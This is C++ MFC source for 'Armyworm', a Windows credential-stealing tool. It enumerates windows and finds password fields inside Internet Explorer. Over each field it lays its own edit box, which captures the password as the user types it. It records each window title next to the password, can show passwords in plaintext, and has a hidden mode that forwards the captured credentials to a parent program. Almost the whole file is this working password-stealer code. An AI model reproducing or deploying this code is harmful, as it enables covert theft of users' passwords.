
// ArmywormDlg.cpp : 实现文件
// Code By Drizzle.Risk

#include "stdafx.h"
#include "Armyworm.h"
#include "ArmywormDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
public:
//	bool IsFindAPassEdit;
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CArmywormDlg 对话框




CArmywormDlg::CArmywormDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CArmywormDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	flag = 0;
}

void CArmywormDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_LIST1, m_list);
	DDX_Control(pDX, IDC_TIPS, m_tips);
}

BEGIN_MESSAGE_MAP(CArmywormDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BUTTON3, &CArmywormDlg::OnBnClickedButton3)
	ON_BN_CLICKED(IDC_BUTTON4, &CArmywormDlg::OnBnClickedButton4)
	ON_MESSAGE(WM_SETTEXT, OnMyMessage)
	ON_WM_TIMER()
	ON_WM_ACTIVATE()
END_MESSAGE_MAP()


// CArmywormDlg 消息处理程序

BOOL CArmywormDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	InitAllMe();	//初始化粘虫
	flag = 0;
	InitList();
	GetDlgItem(IDC_BUTTON3)->EnableWindow(TRUE);
	GetDlgItem(IDC_BUTTON4)->EnableWindow(FALSE);
	GetDlgItem(IDC_CHECK1)->EnableWindow(TRUE);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CArmywormDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CArmywormDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CArmywormDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



int CArmywormDlg::InitList(void)
{
	LONG lStyle; 
	lStyle = GetWindowLong(m_list.m_hWnd, GWL_STYLE);//获取当前窗口style 
	lStyle &= ~LVS_TYPEMASK; //清除显示方式位 
	lStyle |= LVS_REPORT; 
	    SetWindowLong(m_list.m_hWnd, GWL_STYLE, lStyle);
	DWORD dwStyle1 = m_list.GetExtendedStyle();
	dwStyle1 |= LVS_EX_GRIDLINES;
	dwStyle1 |= LVS_EX_FULLROWSELECT;
	m_list.SetExtendedStyle(dwStyle1); 

	lStyle = GetWindowLong(m_list.m_hWnd, GWL_STYLE);
	lStyle &= ~LVS_TYPEMASK;
	lStyle |= LVS_REPORT; 
	    SetWindowLong(m_list.m_hWnd, GWL_STYLE, lStyle);
	dwStyle1 = m_list.GetExtendedStyle();
	dwStyle1 |= LVS_EX_GRIDLINES;
	dwStyle1 |= LVS_EX_FULLROWSELECT;
	m_list.SetExtendedStyle(dwStyle1);

	m_list.InsertColumn(0,"编号",LVCFMT_CENTER);
	m_list.InsertColumn(1,"窗口句柄",LVCFMT_CENTER);
	m_list.InsertColumn(2,"窗口标题",LVCFMT_CENTER);
	m_list.InsertColumn(3,"密码内容",LVCFMT_CENTER);

	m_list.SetColumnWidth(0,40);
	m_list.SetColumnWidth(1,60);
	m_list.SetColumnWidth(2,260);
	m_list.SetColumnWidth(3,220);

	return 0;
}


void CArmywormDlg::OnBnClickedButton3()
{//开启粘虫，增加自动探测模块
	//初始化LIST
	this->IsFindAPassEdit = false;
	{
		//初始化重复数组
		for ( int flag = 0 ; flag < 1024  ; flag++  )
		{
			already_done[ flag ] = NULL;
		}
	}
	if(me!=NULL)
	{//先关闭已经存在的对话框
		this->ClearAllMe();
	}
	m_list.DeleteAllItems();
	flag = 0;
	//提取、设置一些控件
	GetDlgItem(IDC_BUTTON3)->EnableWindow(FALSE);
	if( this->IsHideUse  )
		GetDlgItem(IDC_BUTTON4)->EnableWindow(FALSE);
	else
		GetDlgItem(IDC_BUTTON4)->EnableWindow(TRUE);
	GetDlgItem(IDC_CHECK1)->EnableWindow(FALSE);
	//tips
	this->m_tips.SetWindowTextA("提示：已经开始自动替换IE中存在的密码框！");
	if( !this->IsHideUse )
	{//如果不是隐藏调用，才会用到这个checkbox
		if(IsDlgButtonChecked(IDC_CHECK1) == BST_CHECKED)
		{
			this->IsPlaintext = true;
		}
		else if(BST_UNCHECKED == IsDlgButtonChecked(IDC_CHECK1))
		{
			this->IsPlaintext = false;
		}
	}
	//搜索所有窗口
	BOOL CALLBACK lpEnumFunc(HWND hwnd, LPARAM lParam);
	::EnumWindows(lpEnumFunc , (LPARAM)this);
	//增加记时器
	SetTimer(1,1000,NULL);

}
BOOL CALLBACK lpEnumFunc(HWND hwnd, LPARAM lParam)
{
	CArmywormDlg * that = (CArmywormDlg*)lParam;
	CString SearchTitle_tmp = "";	//搜索字符串，设置为空，匹配所有
	char title_buf[1024]={0};
	::GetWindowText(hwnd , title_buf , 1023);

	CString str = title_buf;
	SearchTitle_tmp.MakeLower();
	str.MakeLower();
	if( -1 != str.Find(SearchTitle_tmp))		//这里是搜索字符串，暂时不用
	{
		//遍历该窗口下的所有控件
		BOOL CALLBACK EnumPro(HWND hwnd, LPARAM lParam);
		::EnumChildWindows(hwnd , EnumPro , (LPARAM)that);
	}
	return true;
}
bool CArmywormDlg::FindIfAlreadyDone(HWND hwnd)
{
	for ( int flag = 0 ; already_done[ flag ] != NULL &&  flag < 1024  ; flag++  )
	{
		if(  hwnd == already_done[ flag ] )
			return true;
		else if( hwnd == NULL )
			break;
	}
	if( flag < 1023 )
	{//如果没满，则添加
		already_done[ flag ] = hwnd;
		return false;
	}
	if( flag >= 1023  )
	{//如果满了
		return false;
	}
	return false ;
}
BOOL CALLBACK EnumPro(HWND hwnd, LPARAM lParam)
{
	CArmywormDlg * that = (CArmywormDlg*)lParam;

	bool IsPassEdit = false;
	bool IsParentIe = false;	//是否属于IE
	bool IsATL = false;	//是否为ATL控件（activeX控件）
	HWND parent_tab = NULL;	//IE tab标签的句柄
	HWND parent = NULL;
	HINSTANCE hInstance = AfxGetInstanceHandle();
	char class_name0[255]={0};
	char class_name[255]={0};

	//获取EDIT框样式
	LONG lstyle = ::GetWindowLong(hwnd,GWL_STYLE);
	if(lstyle & ES_PASSWORD)
	{
		IsPassEdit = true;
	}
	//获取EDIT框大小位置
	RECT rt = { 0 };
	::GetWindowRect(hwnd, &rt); 

	POINT pt = { rt.left, rt.top };
	long lWidth = rt.right - rt.left;	//EDIT宽度
	long lHeight = rt.bottom - rt.top;	//EDIT高度

	//获取控件类名
	GetClassName(hwnd , class_name0 , 254);
	CString tmp = class_name0;
	int find_code = tmp.Find("ATL:");
	if( find_code == 0 ) 
	{//如果ATL:子串在起始位置，则认为此控件为ATL控件
		IsATL = true;
	}
	if(IsPassEdit || IsATL)	
	{//发现了密码控件，或ATL控件
		//判断是否重复
		if( that->FindIfAlreadyDone( hwnd ) )
		{//如果重复，忽略此密码框，如果没有，则添加
				return true;
		}

		//判断是否为主窗体句柄
		HWND hwnd_if_main = hwnd;
		for(int flag = 0 ; flag < 40 ; flag++)
		{
			hwnd_if_main = ::GetParent(hwnd_if_main);
			if(  hwnd_if_main == that->ParamMainHwnd  &&  hwnd_if_main != NULL)
			{//如果发现是主窗体，则放弃
				return true;
			}
		}
		//首先尝试找到IE的TAB标签
		parent = hwnd;
		for(int flag = 0 ; flag < 25 ; flag++)
		{
			parent = ::GetParent(parent);
			memset(class_name, 0,255);
			if(GetClassName(parent , class_name , 254))
			{
				if(strcmp(class_name , "TabWindowClass") == 0)
				{//TabWindowClass
					IsParentIe = true;
					parent_tab = parent;
					break;
				}
			}
		}
		//然后继续在这里判断该控件的上层窗体中是否为IE，不是则直接返回true
		parent = hwnd;
		for(int flag = 0 ; flag < 25 ; flag++)
		{
			parent = ::GetParent(parent);
			memset(class_name, 0,255);
			if(GetClassName(parent , class_name , 254))
			{//如果获取成功
				if(strcmp(class_name , "Internet Explorer_Server") == 0)
				{//Internet Explorer_Server
					IsParentIe = true;
					break;
				}
				else if(strcmp(class_name , "IEFrame") == 0)
				{//IEFrame
					IsParentIe = true;
					break;
				}
			}
		}

		if(!IsParentIe)
		{//如果不属于IE，直接忽视此密码框，继续遍历寻找
			return true;
		}
		//如果属于IE，则在此继续向上找，找到顶级窗口，并且获取句柄和标题内容
		HWND real_parent = NULL;
		if(parent_tab == NULL)
		{//如果没有找到TAB标签
			for(int flag = 0 ; flag < 25 ; flag++)
			{
				if( parent != NULL )
				{
					real_parent = parent;
					parent = ::GetParent(parent);
				}
				else
				{//找到了顶级窗口real_parent
					break ;
				}
			}
		}
		else
		{//上面已经找到了tab标签
			real_parent = parent_tab;
		}
		////获取内容,并显示
		char title_buf[1024]={0};
		::GetWindowText(real_parent , title_buf , 1023);
		CString str = title_buf;
		str.MakeLower();

		that->IsFindAPassEdit = true;
		//到这里，既是密码框，并且属于IE，so，粘虫出动!
		that->me[that->me_flag] = new MYEDIT ;
		that->me[that->me_flag] ->hwnd = hwnd;
		that->me[that->me_flag] ->parent = real_parent;
		that->me[that->me_flag] ->message_hwnd = that->m_hWnd;
		that->me[that->me_flag] ->num = that->me_flag;	//粘虫的编号
		that->me[that->me_flag]->lwidth = lWidth;	//粘虫的宽度
		that->me[that->me_flag]->lheight = lHeight;	//粘虫的高度
		that->me[that->me_flag] ->Create(IDD_DIALOGEDIT);

		RECT rect;
		::GetWindowRect(that->me[that->me_flag] ->hwnd , &rect);
		//::MoveWindow(that->me[that->me_flag] ->m_hWnd,rect.left,rect.top,rect.right-rect.left,rect.bottom-rect.top,1);
		::MoveWindow(that->me[that->me_flag]->m_hWnd, rect.left, rect.top, lWidth, lHeight, 1);
		if (that->IsPlaintext)
		{//如果是明文显示，则显示明文
			that->me[that->me_flag] ->m_edit.SetPasswordChar(0);
		}
		else
		{
			that->me[that->me_flag] ->m_edit.SetPasswordChar('*');
		}
		that->me[that->me_flag]->m_edit.SetWindowTextA("");	//设置密码框初值

		char hwnd_buf[15] = { 0 };
		char num_buf[10] = { 0 };
		itoa(that->flag + 1, num_buf, 10);
		sprintf(hwnd_buf, "%d", that->me[that->me_flag]->m_hWnd);

		that->m_list.InsertItem(that->me_flag, num_buf, NULL);
		that->m_list.SetItemText(that->me_flag, 1, hwnd_buf);
		that->m_list.SetItemText(that->me_flag, 2, title_buf);
		that->flag++;

		that->me[that->me_flag] ->ShowWindow(SW_SHOW);
		that->me[that->me_flag] ->UpdateWindow();
		that->me_flag ++ ;


		if(that->me_flag >= 100)
		{
			return false;
		}
		return true;
	}
	return true;
}


void CArmywormDlg::OnBnClickedButton4()
{
	///关闭所有粘虫
	if(me != NULL)
	{
		this->ClearAllMe();
	}
	GetDlgItem(IDC_BUTTON3)->EnableWindow(TRUE);
	GetDlgItem(IDC_BUTTON4)->EnableWindow(FALSE);
	GetDlgItem(IDC_CHECK1)->EnableWindow(TRUE);
	this->m_tips.SetWindowTextA("");
}


void CArmywormDlg::ClearAllMe(void)
{//清理所有粘虫框
	for( int flag = 0 ; flag < me_flag ;  flag++ )
	{
		me[flag]->CloseWindow();
		me[flag]->DestroyWindow();
		me[flag] = NULL;
	}
	me_flag = 0;
}


void CArmywormDlg::InitAllMe(void)
{//初始化所有粘虫
	for( int flag = 0 ; flag < 100 ;  flag++ )
	{
		me[flag] = NULL;
	}
	me_flag = 0;
}
LRESULT CArmywormDlg::OnMyMessage(WPARAM wParam, LPARAM lParam)
{
	int num = -1; 
	CString buf = (LPCTSTR)lParam;
	CString buf_num;
	CString buf_pass;
	AfxExtractSubString (buf_num,buf,0,'\r\n');//得到粘虫编号
	AfxExtractSubString (buf_pass,buf,1,'\r\n');//得到粘虫当前密码

	num = atoi( buf_num.GetBuffer( buf_num.GetLength() ) );

	this->m_list.SetItemText( num  ,3, buf_pass );

	if(  this->IsHideUse  )
	{//在这里发送消息给主程序
		CString buf;
		CString buf_hwnd = this->m_list.GetItemText(num , 1);
		CString buf_title = this->m_list.GetItemText(num , 2);
		CString buf_pass = this->m_list.GetItemText(num , 3);
		buf = "NianChong\r\n";
		buf += buf_hwnd;
		buf += "\r\n";
		buf += buf_title;
		buf += "\r\n";
		buf += buf_pass;

		::SendMessage(this->ParamMainHwnd,WM_SETTEXT,0,(LPARAM)(char *)(buf.GetBuffer(buf.GetLength())));
	}
	return 0;
}


void CArmywormDlg::CheckParam(void)
{
	this->IsHideUse = false;	//默认不隐藏调用
	ParamMainHwnd = NULL;
	//接收参数
	AfxGetApp()->m_lpCmdLine;
	const TCHAR* param_tmp = AfxGetApp()->m_lpCmdLine;
	CString param = param_tmp;
	CString Hwnd_str , IsPassword_str;	//两个参数，第一个为调用窗口的句柄（16进制格式），第二个表示是否开启明文密码（password，notpasswoord）
	int errcode = 0;

	//如果参数为空
	if(param.IsEmpty())
	{
		this->IsHideUse = false;	//不隐藏调用
	}
	else
	{
		//分别提取RPID、TmpPath
		errcode = AfxExtractSubString(Hwnd_str, param, 0, ' ');
		if(errcode == 0)
		{
			this->IsHideUse = false;	//不隐藏调用
		}
		errcode = AfxExtractSubString(IsPassword_str, param, 1, ' ');
		if(errcode == 0)
		{
			this->IsHideUse = false;	//不隐藏调用
		}
	}
	if( this->IsHideUse )
	{
		//如果有参数，则判断参数是否合法
		//如果参数过长，直接退出
		if(Hwnd_str.GetLength() >= 20)
			OnCancel();
		if(IsPassword_str.GetLength() >= 20)
			OnCancel();
		//转换句柄，并存入ParamMainHwnd
		int hwnd_int = 0;
		hwnd_int = strtoul(Hwnd_str.GetBuffer(Hwnd_str.GetLength()),0,16);
		this->ParamMainHwnd = (HWND)hwnd_int;
		//获取显示密码的状态
		if(IsPassword_str == "password")
		{//如果密文显示
			this->IsPlaintext  = false;
		}
		else if( IsPassword_str == "notpassword" )
		{//如果明文显示
			this->IsPlaintext  = true;
		}
		else
		{//如果都不是，则退出
			OnCancel();
		}
	}
}


void CArmywormDlg::OnTimer(UINT_PTR nIDEvent)
{
	//搜索所有窗口
	BOOL CALLBACK lpEnumFunc(HWND hwnd, LPARAM lParam);
	::EnumWindows(lpEnumFunc , (LPARAM)this);

	CDialogEx::OnTimer(nIDEvent);
}


void CArmywormDlg::OnActivate(UINT nState, CWnd* pWndOther, BOOL bMinimized)
{
	CDialogEx::OnActivate(nState, pWndOther, bMinimized);
}


LRESULT CArmywormDlg::DefWindowProc(UINT message, WPARAM wParam, LPARAM lParam)
{
	if( message==133 ) 
	{	
		this->CheckParam();	//检查参数
		if( this->IsHideUse )
		{
			ShowWindow(SW_HIDE);
		}
	}
	return CDialogEx::DefWindowProc(message, wParam, lParam);
}